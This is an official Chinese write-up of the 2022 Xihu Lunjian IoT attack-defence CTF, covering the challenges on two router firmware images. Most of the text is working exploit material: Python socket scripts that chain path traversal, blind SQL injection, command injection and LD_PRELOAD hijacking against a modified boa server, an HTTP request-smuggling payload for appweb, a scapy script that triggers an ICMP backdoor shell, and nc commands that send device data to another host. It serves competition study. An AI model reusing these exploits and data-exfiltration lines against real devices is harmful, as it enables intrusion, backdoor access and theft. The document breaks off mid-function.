# 2022西湖论剑 IoT-AWD 赛题官方 WriteUp （上篇）：一号固件&二号固件

> 原文: https://www.ctfiot.com/105717.html
> ID: 105717

点击蓝字 关注我们

本届西湖论剑比赛延续了在IoT真实硬件设备上进行解题的竞赛风格，采用了 AWD 攻防赛模式，比赛期间为每个参赛队伍提供一个海特开源路由设备（HatLab Gateboard-One）作为靶标环境。该设备预设若干系统漏洞，参赛队伍可利用不同漏洞对其他队伍得设备发起攻击以获得分数，同时对该设备进行加固防护，避免被其他参赛队伍攻击成功而丢失分数。

比赛提供了四份固件（其中一份是备份固件，比赛时暂未放出），每个固件提供了若干道赛题，下面是各个固件的赛题WriteUp。本文为1号和2号固件。

一号固件

1

easybluetooth

蓝牙连接工具可以使用ble-serial。

通过ble-scan扫描周围蓝牙设备，带有HZCSSC的就是目标设备。然后用ble-serial -d进行连接，连接之后会将蓝牙串口映射到本地

ble-serial -d 00:00:00:00:00:FF

10:32:39.713 | INFO | linux_pty.py: Port endpoint created on /tmp/ttyBLE -> /dev/pts/4

10:32:39.713 | INFO | ble_interface.py: Receiver set up

10:32:39.950 | INFO | ble_interface.py: Trying to connect with 00:00:00:00:00:FF: HZCSSC-0000000000ff

10:32:41.672 | INFO | ble_interface.py: Device 00:00:00:00:00:FF connected

10:32:41.672 | INFO | ble_interface.py: Found write characteristic 0000ffe1-0000-1000-8000-00805f9b34fb (H. 4)

10:32:41.672 | INFO | ble_interface.py: Found notify characteristic 0000ffe1-0000-1000-8000-00805f9b34fb (H. 4)

10:32:41.777 | INFO | main.py: Running main loop!

10:33:00.364 | WARNING | ble_interface.py: Device 00:00:00:00:00:FF disconnected

10:33:00.365 | INFO | ble_interface.py: Stopping Bluetooth event loop

10:33:00.365 | WARNING | main.py: Shutdown initiated

10:33:00.365 | INFO | linux_pty.py: Serial reader and symlink removed

10:33:00.365 | INFO | main.py: Shutdown complete.

然后通过串口工具(如linux的screen，mac的minicom)访问/tmp/ttyBLE就可以进入到题目中。

通过字符串匹配可以找到第一个文件是eblec，文件会将收集的数据通过ubus传输到nc_device的服务端，这个在ebles文件中。

在ebles接收数据后有一个将小写字母转成大写字母的操作，之后就是system命令注入。小写字母转成大写字母可以通过环境变量绕过。

poc如下：

import os

import time

def readuntile(f,context):

    while True:

        buf=f.readline(len(context))

        if buf==context:

            break

os.system(“ble-serial -d `ble-scan | grep HZCSSC |head -n 1 | awk ‘{print $1}’` &”)

time.sleep(10)

f=open(“/tmp/ttyBLE”,’rw+’)

readuntile(f,”input time:”)

f.write(“11n”)

readuntile(f,”input port:”)

f.write(“1234n”)

readuntile(f,”input ip:”)

f.write(“;${PATH:10:8}/${PATH:8:1}? 192.168.132.2 2333 |${PATH:14:4}${PATH:4:2}?| ${PATH:10:8}/${PATH:8:1}? 192.168.132.2 4000;n”)

f.close()

xhttpd

查看开放的端口信息看到 8080 端口运行了 web 服务，该 web 服务基于 boa 修改而来，配置文件：/etc/boa/boa.conf

Port 8080

User root

Group root

ErrorLog /tmp/error_log

AccessLog /tmp/access_log

ServerName www.your.org.here

DocumentRoot /usr/bin/www

UserDir public_html

DirectoryIndex index.html

KeepAliveMax 1000

KeepAliveTimeout 10

MimeTypes /etc/mime.types

DefaultType text/plain

CGIPath /bin:/usr/bin:/usr/local/bin

ScriptAlias /cgi-bin/ /usr/bin/www/cgi-bin/

web 路径位于 /usr/bin/www，且 /cgi-bin/ 被定向到 /usr/bin/www/cgi-bin/ 下

在 /usr/bin/www/cgi-bin/ 目录中可以看到一些 cgi 程序，分析 get.cgi，主要功能

int sub_408098()

{

  FILE *stream; // [sp+18h] [+18h]

  char v2[128]; // [sp+1Ch] [+1Ch] BYREF

  char v3[40]; // [sp+9Ch] [+9Ch] BYREF

  char v4[1028]; // [sp+C4h] [+C4h] BYREF

  strcpy(v2, “/usr/bin/upload/”);

  get_cgi(“name”, v3, 30);

  strcat(v2, v3);

  stream = fopen(v2, “rb”);

  if ( !stream )

    return fwrite(“

File not found

n”, 1u, 0x16u, dword_419154);

  memset(v4, 0, 0x400u);

  fread(v4, 0x400u, 1u, stream);

  fclose(stream);

  fprintf(dword_419154, v4);

  return system(“rm -rf /usr/bin/upload/*”);

}

代码从用户请求中读取 name 参数，拼接出路径直接 fopen 打开文件读出内容返回，缺少对路径穿越的限制，可以利用此漏洞直接读取 flag

分析 upload.cgi

size_t sub_4080B8()

{

  FILE *s; // [sp+18h] [+18h]

  int v2; // [sp+1Ch] [+1Ch] BYREF

  char v3[2048]; // [sp+20h] [+20h] BYREF

  char v4[1024]; // [sp+820h] [+820h] BYREF

  size_t v5; // [sp+C20h] [+C20h] BYREF

  char v6[132]; // [sp+C24h] [+C24h] BYREF

  if ( get_cgi_0(“file”, v3, 1024) )

    return puts(“

No file was uploaded.

“);

  if ( strlen(v3) >= 0x19 )

    return puts(“

Wrong parameter

“);

  if ( sub_404248(“file”, &v2) )

    return fwrite(“Could not open the file.

n”, 1u, 0x1Cu, dword_419154);

  strcpy(v6, “/usr/bin/upload/”);

  strcat(v6, v3);

  s = fopen(v6, “wb”);

  while ( !sub_4043C8(v2, v4, 1024, &v5) )

    fwrite(v4, v5, 1u, s);

  fclose(s);

  return sub_404480(v2);

}

此接口读取用户输入的 file 参数以及文件内容，利用 file 参数拼接路径，打开对应文件写入内容。

此处也缺少路径穿越验证，可通过此接口实现任意文件写入。

分析 diag.cgi

size_t sub_4083B0()

{

  char v1[28]; // [sp+18h] [+18h] BYREF

  char v2[68]; // [sp+34h] [+34h] BYREF

  sub_403D98(“type”, v1, 20);

  sub_403D98(“param”, v2, 64);

  if ( filter(v2) )

    return fwrite(“

wrong parameter

n”, 1u, 0x17u, dword_419154);

  if ( !strncmp(v1, “ping”, 4u) )

  {

    exec_ping(v2);

  }

  else if ( !strncmp(v1, “curl”, 4u) )

  {

    exec_curl(v2);

  }

  return fwrite(“donen”, 1u, 5u, dword_419154);

}

此接口使用用户可控的参数拼接命令执行，虽然对参数有字符过滤，但是过滤时没有考虑换行符，导致存在命令注入漏洞。

分析 xhttpd 程序，可以参考 boa 源代码辅助分析。

主要变更的一些位置

// 1. 请求头处理部分

else if ( strcmp(v11, “ACCEPT”) )

      {

        v10 = memcmp(v11, “AUTHORIZATION”, 0xDu);

        if ( v10 )

          return sub_45BB78(a1, v11, v4, 0);

        if ( strlen(v4) >= 0x101 || strncasecmp(v4, “Basic “, 6u) || (v12 = strchr(v4, ‘:’)) == 0 )

        {

          sub_460034(a1);

          return v10;

        }

        *v12 = 0;

        a1[36] = strdup(v4 + 6);

        a1[37] = strdup(v12 + 1);

      }

// 2. 设置环境变量，add_cgi_env 函数的最后一个参数被设置为 0，不添加 HTTP_ 前缀

if ( v6 == 0x48 )

    {

      if ( strcmp(v11, “HOST”) || a1[24] )

        return add_cgi_env(a1, v11, v4, 0);

      a1[24] = v4;

      return 1;

    }

// 3. 添加身份验证

  v8 = *(a1 + 144);

  if ( !v8 )

    goto LABEL_9;

  if ( !*(a1 + 148) )

    goto LABEL_9;

  memset(v15, 0, sizeof(v15));

  if ( db_query(v15, v8) )

    goto LABEL_9;

设置环境变量时未添加 HTTP_ 前缀，用户可以控制 LD_PRELOAD 变量实现链接库劫持。而身份验证部分会使用用户提交的数据拼接 SQL 语句执行，存在 SQL 注入漏洞

int __fastcall sub_45F4F4(int a1, const char *a2)

{

  const char *v3; // $v0

  int v4; // $s1

  int v7; // [sp+2Ch] [-41Ch] BYREF

  const char *v8; // [sp+30h] [-418h] BYREF

  char v9[1024]; // [sp+34h] [-414h] BYREF

  v7 = 0;

  v8 = 0;

  if ( sub_45A9BC(“/tmp/user.db”, &v7) )

  {

    v3 = sub_41FED4(v7);

    fprintf(stderr, “Cannot open database: %sn”, v3);

  }

  else

  {

    strcpy(v9, “SELECT * FROM User where Name='”);

    strcat(v9, a2);

    strcat(v9, “‘;”);

    v4 = sub_44895C(v7, v9, &loc_45EE64 + 1, a1, &v8);

    if ( !v4 )

    {

      sub_433CB8(v7);

      return v4;

    }

    fputs(“Failed to select datan”, stderr);

    fprintf(stderr, “SQL error: %sn”, v8);

    sub_407498(v8);

  }

  v4 = 1;

  sub_433CB8(v7);

  return v4;

}

/tmp/user.db 中默认保存了一 admin 账户，该账户密码随机，利用 SQL 注入可以读出 admin 账户的密码，进行后续利用。

总结一下，本题有 3 种简单解法

1

利用 get.cgi 任意文件读取漏洞直接读取 flag

2

通过 SQL 注入漏洞获取 admin 账户的密码，再访问 diag.cgi 进行命令注入

3

利用 upload.cgi 上传一恶意链接库文件，再控制 LD_PRELOAD 环境变量去加载此文件

EXP

#include

#include

static void demo(void) __attribute__((constructor));

static void demo(void)

{

    printf(“Hellon”);

    FILE* fp = fopen(“/dev/ttyUSB0”, “r”);

    char flag[100];

    fread(flag, 100, 1, fp);

    printf(“%sn”, flag);

    fclose(fp);

}

import socket

import sys

import string

def method1():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, 8080))

    data = “GET /cgi-bin/get.cgi?name=/../../../dev/ttyUSB0 HTTP/1.1rnHost: %srnAuthorization: Basic guest:
guestrnrn” % (IP)

    s.sendall(data.encode())

    res = s.recv(1024)

    res = s.recv(1024)

    print(res)

    s.close()

def method2():

    admin_password = “”

    table = string.ascii_letters + “0123456789”

    for i in range(8):

        for k in table:

            data = “GET / HTTP/1.1rnHost: %srnAuthorization: Basic guest’;select Password from User where Name=’admin’ and case when (hex(substr(Password,%s,1))=hex(‘%s’)) then 1 else load_extension(1) end;–:
rnrn” % (IP, str(i + 1), k)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((IP, 8080))

            s.sendall(data.encode())

            res = s.recv(1024)

            if b”HTTP/1.1 403 Forbidden” in res:

                admin_password += k

                break

            s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, 8080))

    data = “GET /cgi-bin/diag.cgi?type=ping¶m=127.0.0.1%%0a%%74%%6f%%75%%63%%68%%20%%2f%%68%%61%%63%%6b%%65%%64%%5f%%62%%79%%5f%%6e%%70%%63 HTTP/1.1rnHost: %srnAuthorization: Basic admin:%srnrn” % (IP,admin_password)

    s.sendall(data.encode())

    res = s.recv(1024)

    res = s.recv(1024)

    print(res)

    s.close()

def method3():

    f = open(“./fake.so”, “rb”)

    payload = f.read()

    f.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, 8080))

    fixed_name = “PDlZpPmkIzlIaIP”

    content_length = str(146 + len(payload) + len(fixed_name))

    data = b”POST /cgi-bin/upload.cgi HTTP/1.1rnAuthorization: Basic guest:
guestrnHost: %srnContent-Length: %srnContent-Type: multipart/form-data; boundary=—-WebKitFormBoundary0WLLWzLToAYE3yy8rnUser-Agent: Mozilla/5.0rnAccept: text/htmlrnConnection: closernrn——WebKitFormBoundary0WLLWzLToAYE3yy8rnContent-Disposition: form-data; name=”file”; filename=”%s”rnrn%srn——WebKitFormBoundary0WLLWzLToAYE3yy8–” % (IP.encode(), content_length.encode(), fixed_name.encode(), payload)

    s.sendall(data)

    res = s.recv(1024)

    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, 8080))

    data = “GET /cgi-bin/get.cgi HTTP/1.1rnHost: %srnLD_PRELOAD: /usr/bin/upload/PDlZpPmkIzlIaIPrnAuthorization: Basic guest:
guestrnrn” % (IP)

    print(data)

    s.sendall(data.encode())

    res = s.recv(1024)

    print(res)

    s.close()

if __name__ == “__main__”:

    if len(sys.argv) != 3:

        print(“python3 checker.py”)

        exit(0)

    IP = sys.argv[1]

    method = sys.argv[2]

    if method == “1”:

        method1()

    elif method == “2”:

        method2()

    elif method == “3”:

        method3()

jailbreak

通过分析/etc/init.d/jailbreak文件，发现题目启动了appweb服务，监听了127.0.0.1的7777端口：

#!/bin/sh /etc/rc.common

START=97

USE_PROCD=1

PROG=/usr/sbin/appweb

start_service() {

        procd_open_instance

        procd_set_param command “$PROG” “127.0.0.1:
7777”

        procd_set_param respawn 3600 2 10000

        procd_close_instance

}

reload_service() {

        procd_send_signal appweb

}

同时发现设备启动了nginx服务，在/etc/nginx/conf.d文件夹中，存在reverse.conf文件，配置中新增了一个server，监听59659端口，当请求访问.ejs和.php后缀时，使用反向代理到127.0.0.1的7777端口服务上，也就是appweb服务：

server { 

#see uci show ‘nginx._redirect2ssl’

listen 59659;

listen [::]:
59659;

location ~* .(ejs|php)$ {

proxy_redirect off;

proxy_set_header X-Real-IP $remote_addr;

proxy_set_header X-Real-PORT $remote_port;

proxy_set_header Host $host;

proxy_set_header Proxy “”;

proxy_pass   http://127.0.0.1:
7777;

}

}

因此这里的分析重点是appweb。

通过ldd命令查看appweb依赖库，发现mod_ejs.so模块，此模块的功能为appweb解析ejs脚本，并以handler的形式注册到appweb上，实现的代码位置在ejsAppweb.c代码中：

MprModule *maEjsHandlerInit(MaHttp *http, cchar *path)

{

    MprModule       *module;

    MaStage         *handler;

    EjsWebControl   *control;

    control = mprAllocObjZeroed(http, EjsWebControl);

    control->defineParams = defineParams;

    control->discardOutput = discardOutput;

    control->error = error;

    control->getHeader = getHeader;

    control->getVar = getVar;

    control->redirect = redirect;

    control->setCookie = setCookie;

    control->setHeader = setHeader;

    control->setHttpCode = setHttpCode;

    control->setMimeType = setMimeType;

    control->setVar = setVar;

    control->write = writeBlock;

    control->serverRoot = mprStrdup(control, http->defaultServer->serverRoot);

    control->searchPath = mprJoinPath(control, control->serverRoot, “modules”);

#if BLD_FEATURE_MULTITHREAD

    {

        MprMutex   *mutex;

        /*

         *  This mutex is used very sparingly and must be an application global lock.

         */

        mutex = mprCreateLock(control);

        control->lock = ejsWebLock;

        control->unlock = ejsWebUnlock;

        control->lockData = mutex;

    }

#endif

    if (ejsOpenWebFramework(control, 1) < 0) {

        mprError(http, “Could not initialize the Ejscript web framework”);

        mprFree(control);

        return 0;

    }

    handler = maCreateHandler(http, “ejsHandler”, 

        MA_STAGE_GET | MA_STAGE_HEAD | MA_STAGE_POST | MA_STAGE_PUT | MA_STAGE_VARS | MA_STAGE_VIRTUAL);

    if (handler == 0) {

        mprFree(control);

        return 0;

    }

    http->ejsHandler = handler;

    handler->match = matchEjs;

    handler->open = openEjs;

    handler->run = runEjs;

    handler->incomingData = incomingEjsData;

    handler->parse = parseEjs;

    handler->stageData = control;

…

其中handler结构体的各个结构体被赋值为函数指针，表示处理请求的各个阶段，关于这块内容可以参考appweb的开发文档：

https://www.embedthis.com/appweb/doc/developers/handlers.html

根据nginx配置文件中的定义，找到mod_ejs.so二进制，加载到IDA中，找到matchejs函数，这步可根据源码来逆向对应的函数指针：

函数代码中，会对请求的url进行strcmp比较，如当url为index.ejs和login_verify.ejs时，会进入到不同的逻辑，当比较进入index.ejs的逻辑时，调用了mprLookupHash函数获取到请求的http头部的HTTP_EJS变量（实际上是EJS头），并将字段的值直接作为system函数的参数，如果能控制HTTP_EJS头部字段的内容就能达到命令执行的效果：

v8 = 124704;

  v12 = a1[8];

  v13 = *(a1[9] + 644);

  if ( v13 && !strcmp(v13, “mod”) )

  {

    maFormatBody(a1, “Bad Request”, “Can’t serve *.mod files”);

    maFailRequest(a1, 400, “Can’t server *.mod files”);

  }

  if ( *(*(v12 + 200) + 20) != *(a1[73] + 104) && mprStrcmpAnyCase(v13, “ejs”) )

    return 0;

  IS_AUTHORIZE = req_is_auth(a1) != 0;

  if ( !strcmp(*(v12 + 72), “/index.ejs”) )

  {

    if ( IS_AUTHORIZE )

    {

      command = mprLookupHash(*(v12 + 180), “HTTP_EJS”);

      system(command);

      maFormatBody(a1, “Hello Admin!”, “Login successs!”);

      maFailRequest(a1, 200, “Login successs!”);

    }

    else

    {

      v4 = strlen(*(v12 + 112));

      s = malloc(v4 + 128);

      sprintf(s, “http://%s:%d/login.html”, *(v12 + 112), 59659);

      maFormatBody(a1, “Forbidden”, “Not Authorize! Please Login!”);

      maSetHeader(a1, 0, “Location”, s, 124704);

      maFailRequest(a1, 302, “Not Authorize! Please Login!”);

      free(s);

    }

  }

  if ( !strcmp(*(v12 + 72), “/login_verify.ejs”) )

  {

      …

但是此时需要满足IS_AUTHORIZE的值为1，该值是req_is_auth函数的返回值，req_is_auth函数代码如下，比较了HTTP_X_REAL_IP的头字段的值（即X-Real-IP头的值）是否为127.0.0.1，是的话就返回1：

bool __fastcall req_is_auth(int a1)

{

  _BOOL4 result; // $v0

  char *v2; // [sp+18h] [+18h]

  v2 = mprLookupHash(*(*(a1 + 32) + 180), “HTTP_X_REAL_IP”);

  if ( v2 )

    result = strcmp(v2, “127.0.0.1”) == 0;

  else

    result = 0;

  return result;

}

由于外部能访问的只有nginx的59659端口，并且在配置中定义了X-Real-IP头固定为$remote_addr，也就是请求的真实ip地址，从外部访问的话，肯定不是127.0.0.1地址。因此这里就需要使用ssrf或者http请求走私的方法，将X-Real-IP头的值变成127.0.0.1。

在libappweb.so库中，找到parseRequest函数，该函数用来解析所有的http请求，conn为socket连接的对象，packet为数据包的指针结构：

bool __cdecl parseRequest(MaConn_0 *conn, MaPacket_0 *packet)

{

  int len; // [sp+18h] [+18h]

  char *start; // [sp+1Ch] [+1Ch]

  char *end; // [sp+20h] [+20h]

  MaRequest *req; // [sp+24h] [+24h]

  len = mprGetBufLength(packet->content);

  if ( !len )

    return 0;

  start = (char *)mprGetBufStart(packet->content);

  end = (char *)mprStrnstr(start, “rnrn”, len);

  if ( !end )

    return 0;

  if ( end – start >= conn->host->limits->maxHeader )

  {

    maFailConnection(conn, 413, “Header too big”);

    return 0;

  }

  if ( !parseFirstLine(conn, packet) )

    return 0;

  parseHeaders(conn, packet);

  maMatchHandler(conn);

  maCreatePipeline(conn);

  req = conn->request;

  if ( conn->connectionFailed )

  {

    if ( conn->keepAliveCount > 0 )

      mprStaticAssert(“request.c:
192”, “conn->keepAliveCount <= 0”);

LABEL_21:

    conn->state = 5;

    maRunPipeline(conn);

    return conn->disconnected == 0;

  }

  if ( req->remainingContent <= 0 )

  {

    if ( LODWORD(req->length) != -1 || HIDWORD(req->length) != -1 || req->method != 16 && req->method != 32 )

      goto LABEL_21;

    conn->state = 3;

  }

  else

  {

    conn->state = 3;

  }

  return conn->disconnected == 0;

}

在parseHeaders函数里，比较了各个请求头的内容，当请求头存在CONTENT_LENGTH时，有一个关键比较，当req->methodName也就是请求方法为OPTIONS时，会将req->length的值赋值为0，即将请求头中的Content-Length的值赋值为0：

mprAddDuplicateHash(req->headers, keyBuf, value);

        switch ( *key )

        {

          case ‘A’:

            if ( !strcmp(key, “AUTHORIZATION”) )

            {

              v3 = mprStrdup(req, value);

              valuea = (char *)mprSetName(v3, “request.c:
400”);

              req->authType = (char *)mprStrTok(valuea, &off_37B90, &tok);

              req->authDetails = tok;

            }

            else if ( !strcmp(key, “ACCEPT_CHARSET”) )

            {

              req->acceptCharset = value;

            }

            else if ( !strcmp(key, “ACCEPT”) )

            {

              req->accept = value;

            }

            else if ( !strcmp(key, “ACCEPT_ENCODING”) )

            {

              req->acceptEncoding = value;

            }

            break;

          case ‘C’:

            if ( !strcmp(key, “CONTENT_LENGTH”) )

            {

              if ( !strcmp(req->methodName, “OPTIONS”) )

              {

                LODWORD(req->length) = 0;

                HIDWORD(req->length) = 0;

              }

              else if ( req->length < 0 )

              {

                req->length = mprAtoi(value, 10);

                if ( req->length >= 0 )

                {

                  if ( req->length < host->limits->maxBody )

                  {

                    if ( req->length < 0 )

                      mprStaticAssert(“request.c:
435”, “req->length >= 0”);

                    v4 = HIDWORD(req->length);

                    LODWORD(req->remainingContent) = req->length;

                    HIDWORD(req->remainingContent) = v4;

                    req->contentLengthStr = value;

                  }

                  else

回到上层的parseRequest函数，会接着调用maCreatePipeline函数，该函数用来实现pipeline请求，因此可以通过构造一个OPITONS请求方法的请求数据包，在请求数据包体中重新放入一个新的请求，如下：

OPTIONS /index.ejs HTTP/1.1

Host: 192.168.1.100

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

Cache-Control: max-age=0

Content-Length: 245

GET /index.ejs HTTP/1.1

Host: 192.168.1.100

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

X-Real-IP: 127.0.0.1

EJS: ls >/tmp/zzz

Cache-Control: max-age=0

parseHeaders函数在解析Content-Length头部时，判断为OPTIONS方法，即将Content-Length的值变成0，整个请求包就满足了pipeline的请求，变成下面的格式，因此就触发了pipeline机制：

OPTIONS /index.ejs HTTP/1.1

Host: 192.168.1.100

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

Cache-Control: max-age=0

GET /index.ejs HTTP/1.1

Host: 192.168.1.100

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

X-Real-IP: 127.0.0.1

EJS: ls >/tmp/zzz

Cache-Control: max-age=0

由于两个请求的都是index.ejs路由，都会进入MatchEjs函数中进行处理请求，第二个请求中，代码满足了X-Real-IP的值为127.0.0.1，因此EJS头部的值就会作为system函数的参数执行。构造命令为cat /dev/ttyUSB0 | nc 192.168.148.3 8888的方式就能将flag读出并反弹内容到192.168.148.3的8888端口处。

POC

OPTIONS /index.ejs HTTP/1.1

Host: 192.168.1.100

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

Cache-Control: max-age=0

Content-Length: 245

GET /index.ejs HTTP/1.1

Host: 192.168.1.100

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

X-Real-IP: 127.0.0.1

EJS: ls >/tmp/zzz

Cache-Control: max-age=0

doorrrrr

后门程序为pidr。

分析关键函数:

void __noreturn sub_4011DC()

{

    size_t v0; // $v0

    int fd; // [sp+18h] [+18h]

    char *time_key; // [sp+30h] [+30h]

    size_t len_time; // [sp+34h] [+34h]

    void *dest; // [sp+40h] [+40h]

    void *v5; // [sp+44h] [+44h]

    const void *out_key; // [sp+48h] [+48h]

    int recv_buf[257]; // [sp+4Ch] [+4Ch] BYREF

    char deal_buf[100]; // [sp+450h] [+450h] BYREF

    char v9[12]; // [sp+4B4h] [+4B4h] BYREF

    int data[7]; // [sp+4C0h] [+4C0h] BYREF

    int t_port; // [sp+4DCh] [+4DCh] BYREF

    fd = socket(2, 3, 1);                         // icmp

    while ( 1 )

  {

      do

        memset(recv_buf, 0, 0x401u);

      while ( recv(fd, recv_buf, 0x400u, 0) <= 0 );

      time_key = (char *)get_time();

      len_time = strlen(time_key);

      qmemcpy(data, “1#z&* *”&x%”, 11);

      dest = malloc(0xBu);

      memcpy(dest, data, 0xBu);

      deal_date_func((int)dest, (int)deal_buf, ‘K’);// 对data以”K”进行异或，并把输出放在第二个参数

      v5 = malloc(0x20u);

      out_key = malloc(0x20u);

      v0 = strlen((const char *)&recv_buf[8] + 1);

      memcpy(v5, (char *)&recv_buf[8] + 1, v0);

      sub_4009B0((const char *)v5, (int)out_key, deal_buf);// 对v5根据deal_buf进行解密操作,解出key放在第二个参数

      if ( LOBYTE(recv_buf[5]) == 8 && !memcmp(out_key, time_key, len_time) )// 检查是否为ICMP_ECHO的数据包并且time_key是否正确的

    {

        t_port = 0;

        sscanf((const char *)&recv_buf[7], “%d”, &t_port);// 获取到ICMP数据中的port,用作udp_shell port

        if ( t_port > 0 && !fork() )

      {

          udp_shell(recv_buf[3], t_port);

          exit(0);

      }

    }

  }

}

参考处理后伪代码的注释，构造好特定的icmp数据包即可获取到后门shell。注意为udp shell，需使用 ncat -ulp $port 来进行监听。

其中time_key，可以通过固件中的其他程序，如自带的uhttpd服务获取到设备的本地时间。

EXP:

from scapy.all import *

import requests

import argparse

import datetime

def get_time(ip):

    session = requests.Session()

    paramsGet = {“v”:”git-22.288.45155-afd0012″}

    headers = {“Accept”:”*/*”,”User-Agent”:”Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36″,”Connection”:”close”,”Accept-Encoding”:”gzip, deflate”,”Accept-Language”:”zh-CN,zh;q=0.9″}

    response = session.get(“http://{}/luci-static/resources/luci.js”.format(ip), params=paramsGet, headers=headers)

    date_str = response.headers[‘Date’]

    date = datetime.datetime.strptime(date_str, ‘%a, %d %b %Y %H:%M:%S %Z’)

    digits = str(date).replace(‘-‘, ”).replace(‘:’, ”).replace(” “, “”)

    time = digits[4:4+8]

    return time

def diy_encrypt(input_str, key):

    len_input = len(input_str)

    output_list = []

    for i in range(len_input):

        output_list.append(ord(input_str[i]) ^ ord(key[i % len(key)]) ^ 20)

        output_list.append(20)

    output_str = ”.join([chr(x) for x in output_list])

    return output_str

def att(ip,port,timekey):

    output_str = diy_encrypt(timekey,”zh1makaim3n”)

    icmp = ICMP()

    icmp.type = 8  # ICMP Echo Request

    icmp.code = 0  # 0 for ICMP Echo Request and Reply

    icmp.id = 0x1234  # Identifier (arbitrary value)

    icmp.seq = 1  # Sequence number (arbitrary value)

    payload = port.ljust(5,’x00′)+  output_str

    hexdump(payload)

    reply = sr1(IP(dst=”{}”.format(ip))/icmp/payload, verbose=False)

    print(reply)

parser = argparse.ArgumentParser()

parser.add_argument(“ip”)

parser.add_argument(“port”)

if len(sys.argv) == 1:

        parser.parse_args([‘-h’])

args = parser.parse_args()

ip = args.ip

port = args.port

timekey = get_time(ip)

att(ip,port,timekey)

2

二号固件

root shell获取和默认密码重置

通过跟第一套固件的文件进行比对，可以发现/etc/inittab文件被修改，在文件末尾加入::
askconsole:/usr/libexec/login.sh。默认密码修改可以通过改/etc/shadow文件root后面的密文实现。最后可以使用mksquashfs命令将修改后的文件系统打包。

mksquashfs squashfs-root/ hatlab_gateboard-one-squashfs-rootfs.squashfs -b 256K -comp xz -no-xattrs

将打包好之后的文件系统重新刷入就能获取到调试shell接口。

frostheart

题目描述：ikun发现自己的路由器被入侵并在内核和文件系统内多个地方被留下了后门，你能帮他找到这个后门吗。

根据提示在内核和文件系统中都有后门存在，找到/etc/init.d/frostheart文件，执行了main二进制程序：

#!/bin/sh /etc/rc.common

START=98 

USE_PROCD=1

PROG=/usr/sbin/main

start_service() {

procd_open_instance

procd_set_param command “$PROG”

procd_set_param respawn 3600 2 10000

procd_close_instance

}

reload_service() {

procd_send_signal main

}

由于进程进行了隐藏，在ps命令执行的结果中看不到main程序在运行。IDA打开此二进制，定位到main函数，main函数里sub_401764函数里的代码为主要逻辑：

int sub_401764()

{

  size_t v1; // $v0

  int fd; // [sp+18h] [+18h]

  unsigned __int16 v3; // [sp+1Eh] [+1Eh]

  char *v4; // [sp+34h] [+34h]

  const char *v5; // [sp+38h] [+38h]

  const char *s; // [sp+3Ch] [+3Ch]

  FILE *stream; // [sp+40h] [+40h]

  _WORD v8[514]; // [sp+44h] [+44h] BYREF

  char v9[1024]; // [sp+448h] [+448h] BYREF

  fd = socket(2, 3, 1);

  if ( fd >= 0 )

  {

    while ( 1 )

    {

      do

      {

        do

        {

          memset(v8, 0, 0x401u);

          memset(v9, 0, sizeof(v9));

        }

        while ( !recv(fd, v8, 0x400u, 0) );

        v3 = v8[11];

      }

      while ( LOBYTE(v8[10]) != 8 );

      if ( v8[12] == 57005 )

      {

        sub_400A30(&v8[12], v9);

        if ( sub_401460(&v9[3]) == v3 )

        {

          v4 = (char *)sub_40168C();

          if ( v4 )

          {

            v5 = strtok(&v9[3], “@”);

            if ( v5 )

            {

              s = strtok(0, “@”);

              if ( !strcmp(v4, v5) )

              {

                stream = fopen(“/etc/dropbear/authorized_keys”, “a+”);

                v1 = strlen(s);

                fwrite(s, v1, 1u, stream);

                fclose(stream);

              }

            }

            free(v4);

          }

        }

        else

        {

          puts(“checksum error!”);

        }

      }

      else

      {

        puts(“icmp packet id error!”);

      }

    }

  }

  puts(“icmp_socks”);

  return -1;

}

根据提示，代码里监听了socket的icmp包，看样子是解析icmp数据包并解析各个结构。c语言中，icmp结构体的定义如下：

struct icmp {

    uint8_t icmp_type;

    uint8_t icmp_code;

    uint16_t icmp_cksum;

    uint16_t icmp_id;

    uint16_t icmp_seq;

};

LOBYTE(v8[10]) != 8判断了icmp_type是否为echo request，即正常的ping请求，v8[12] == 57005比较了icmp_id是否为57005，这个字段通过构造可以控制，接着将icmp的数据内容作为sub_400A30函数的第一个参数传入，该函数为一个base64解码函数，只是编码表被替换成了Gw6Y/H7PxrieDoRSE58h0fcp1jtlbdON9zKVA2g3+aTCy4XmIBuZUsWJnkMqF。

接着解析数据包中的mac地址，比较是否为eth5网卡的地址，也就是设备wan口的mac地址，这个地址在比赛中很容易获取，即mac地址是根据队伍的序号生成的，如1号队伍的mac地址为00:00:00:00:00:
01依次类推。

如果mac地址匹配的话，会将mac地址@后的内容写入到dropbear的authorized_keys中，如果这里控制的内容为ssh公钥的话，就可以通过ssh公钥登录到设备上。由于题目描述了内核中还存在一处后门，因此就不仅仅只分析main二进制这么简单。

根据此固件和一号固件进行diff，发现在/etc/modules.d/目录下新增了nf-flow-in文件，文件内容为：

nf_flow_table

nf_flow_table_hw

nf_flow_in

其中nf_flow_in为新增的，同时在/lib/modules/5.4.215目录下存在nf_flow_in.ko模块，因此可以确定这个内核模块为这个固件特有的，将其加载到IDA中，找到内核初始化的位置init_nf_flow：

int init_nf_flow()

{

  int v0; // $v0

  int v1; // $s0

